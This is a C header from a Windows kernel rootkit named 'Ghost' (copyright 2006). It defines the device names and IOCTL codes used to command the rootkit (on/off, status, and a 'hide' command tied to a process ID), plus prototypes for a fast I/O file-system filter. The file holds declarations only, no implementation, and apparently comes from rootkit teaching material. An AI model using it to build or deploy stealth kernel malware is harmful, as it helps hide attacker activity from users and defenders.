// Copyright Ric Vieler, 2006
// Definitions for Ghost IO control

#ifndef _GHOST_IO_H_
#define _GHOST_IO_H_

// Use CreateFile( GHOST_DEVICE_OPEN_NAME,,, externally
// Use GHOST_DEVICE_CREATE_NAME internally to create device
// Use GHOST_DEVICE_LINK_NAME internally to create device link
#define GHOST_DEVICE_CREATE_NAME L"\\Device\\MyDeviceDriver"
#define GHOST_DEVICE_LINK_NAME L"\\DosDevices\\MyDeviceDriver"
#define GHOST_DEVICE_OPEN_NAME "\\\\.\\MyDeviceDriver"

// Set command = GHOST_ON or GHOST_OFF for GHOST_ON_OFF_COMMAND
// Get command = GHOST_ON or GHOST_OFF for GHOST_STATUS_COMMAND
typedef struct
{
	int				command;
	DWORD			processId;
} GHOST_IOCTLDATA;

// definitions from ntddk.h
// (these won't be defined in user mode apps)
#ifndef CTL_CODE
#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \
    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
)
#endif
#ifndef FILE_DEVICE_UNKNOWN
#define FILE_DEVICE_UNKNOWN             0x00000022
#endif
#ifndef METHOD_BUFFERED
#define METHOD_BUFFERED                 0
#endif
#ifndef FILE_ANY_ACCESS
#define FILE_ANY_ACCESS                 0
#endif

// Use these to command the rootkit!
#define GHOST_ON_OFF_COMMAND CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) 
#define GHOST_STATUS_COMMAND CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) 
#define GHOST_HIDE_COMMAND CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS) 
#define GHOST_OFF 0
#define GHOST_ON 1

// Internal functions
#ifdef _GHOST_ROOTKIT_

NTSTATUS  OnDeviceControl( PFILE_OBJECT FileObject, BOOLEAN Wait,
	PVOID InputBuffer, ULONG InputBufferLength, 
	PVOID OutputBuffer, ULONG OutputBufferLength, 
	ULONG IoControlCode, PIO_STATUS_BLOCK IoStatus, 
	PDEVICE_OBJECT DeviceObject );
NTSTATUS OnDispatch( PDEVICE_OBJECT DeviceObject, PIRP Irp );

// Fast I/O
VOID FastIoDetachDevice( IN PDEVICE_OBJECT SourceDevice,
	IN PDEVICE_OBJECT TargetDevice );
BOOLEAN FastIoCheckIfPossible( IN PFILE_OBJECT FileObject,
	IN PLARGE_INTEGER FileOffset,
	IN ULONG Length,
	IN BOOLEAN Wait,
	IN ULONG LockKey,
	IN BOOLEAN CheckForReadOperation,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoRead( IN PFILE_OBJECT FileObject,
	IN PLARGE_INTEGER FileOffset,
	IN ULONG Length,
	IN BOOLEAN Wait,
	IN ULONG LockKey,
	OUT PVOID Buffer,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoWrite( IN PFILE_OBJECT FileObject,
	IN PLARGE_INTEGER FileOffset,
	IN ULONG Length,
	IN BOOLEAN Wait,
	IN ULONG LockKey,
	IN PVOID Buffer,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoQueryBasicInfo( IN PFILE_OBJECT FileObject,
	IN BOOLEAN Wait,
	OUT PFILE_BASIC_INFORMATION Buffer,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoQueryStandardInfo( IN PFILE_OBJECT FileObject,
	IN BOOLEAN Wait,
	OUT PFILE_STANDARD_INFORMATION Buffer,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoLock( IN PFILE_OBJECT FileObject,
	IN PLARGE_INTEGER FileOffset,
	IN PLARGE_INTEGER Length,
	PEPROCESS ProcessId,
	ULONG Key,
	BOOLEAN FailImmediately,
	BOOLEAN ExclusiveLock,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoUnlockSingle( IN PFILE_OBJECT FileObject,
	IN PLARGE_INTEGER FileOffset,
	IN PLARGE_INTEGER Length,
	PEPROCESS ProcessId,
	ULONG Key,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoUnlockAll( IN PFILE_OBJECT FileObject,
	PEPROCESS ProcessId,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoUnlockAllByKey( IN PFILE_OBJECT FileObject,
	PVOID ProcessId,
	ULONG Key,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoDeviceControl( IN PFILE_OBJECT FileObject,
	IN BOOLEAN Wait,
	IN PVOID InputBuffer OPTIONAL,
	IN ULONG InputBufferLength,
	OUT PVOID OutputBuffer OPTIONAL,
	IN ULONG OutputBufferLength,
	IN ULONG IoControlCode,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoQueryNetworkOpenInfo( IN PFILE_OBJECT FileObject,
	IN BOOLEAN Wait,
	OUT PFILE_NETWORK_OPEN_INFORMATION Buffer,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoMdlRead( IN PFILE_OBJECT FileObject,
	IN PLARGE_INTEGER FileOffset,
	IN ULONG Length,
	IN ULONG LockKey,
	OUT PMDL *MdlChain,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoMdlReadComplete( IN PFILE_OBJECT FileObject,
	IN PMDL MdlChain,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoPrepareMdlWrite( IN PFILE_OBJECT FileObject,
	IN PLARGE_INTEGER FileOffset,
	IN ULONG Length,
	IN ULONG LockKey,
	OUT PMDL *MdlChain,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoMdlWriteComplete( IN PFILE_OBJECT FileObject,
	IN PLARGE_INTEGER FileOffset,
	IN PMDL MdlChain,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoReadCompressed( IN PFILE_OBJECT FileObject,
	IN PLARGE_INTEGER FileOffset,
	IN ULONG Length,
	IN ULONG LockKey,
	OUT PVOID Buffer,
	OUT PMDL *MdlChain,
	OUT PIO_STATUS_BLOCK IoStatus,
	OUT struct _COMPRESSED_DATA_INFO *CompressedDataInfo,
	IN ULONG CompressedDataInfoLength,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoWriteCompressed( IN PFILE_OBJECT FileObject,
	IN PLARGE_INTEGER FileOffset,
	IN ULONG Length,
	IN ULONG LockKey,
	IN PVOID Buffer,
	OUT PMDL *MdlChain,
	OUT PIO_STATUS_BLOCK IoStatus,
	IN struct _COMPRESSED_DATA_INFO *CompressedDataInfo,
	IN ULONG CompressedDataInfoLength,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoMdlReadCompleteCompressed( IN PFILE_OBJECT FileObject,
	IN PMDL MdlChain,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoMdlWriteCompleteCompressed( IN PFILE_OBJECT FileObject,
	IN PLARGE_INTEGER FileOffset,
	IN PMDL MdlChain,
	IN PDEVICE_OBJECT DeviceObject );
BOOLEAN FastIoQueryOpen( IN PIRP Irp,
	OUT PFILE_NETWORK_OPEN_INFORMATION NetworkInformation,
	IN PDEVICE_OBJECT DeviceObject );
void filterFastIo( PFILE_OBJECT file, BOOL cache, int function );

#define VALID_FAST_IO_DISPATCH_HANDLER(_FastIoDispatchPtr, _FieldName) \
	(((_FastIoDispatchPtr) != NULL) && \
	(((_FastIoDispatchPtr)->SizeOfFastIoDispatch) >= \
	(FIELD_OFFSET(FAST_IO_DISPATCH, _FieldName) + sizeof(void *))) && \
	((_FastIoDispatchPtr)->_FieldName != NULL))

// Function types for filterFastIo
#define FIO_CHECK_IF_POSSIBLE				1
#define FIO_READ							2
#define FIO_WRITE							3
#define FIO_QUERY_BASIC_INFO				4
#define FIO_QUERY_STANDARD_INFO				5
#define FIO_LOCK							6
#define FIO_UNLOCK_SINGLE					7
#define FIO_UNLOCK_ALL						8
#define FIO_UNLOCK_ALL_BY_KEY				9
#define FIO_DEVICE_CONTROL					10
#define FIO_QUERY_NETWORK_OPEN_INFO			11
#define FIO_MDL_READ						12
#define FIO_MDL_READ_COMPLETE				13
#define FIO_PREPARE_MDL_WRITE				14
#define FIO_MDL_WRITE_COMPLETE				15
#define FIO_READ_COMPRESSED					16
#define FIO_WRITE_COMPRESSED				17
#define FIO_MDL_READ_COMPLETE_COMPRESSED	18
#define FIO_MDL_WRITE_COMPLETE_COMPRESSED	19

#endif
#endif

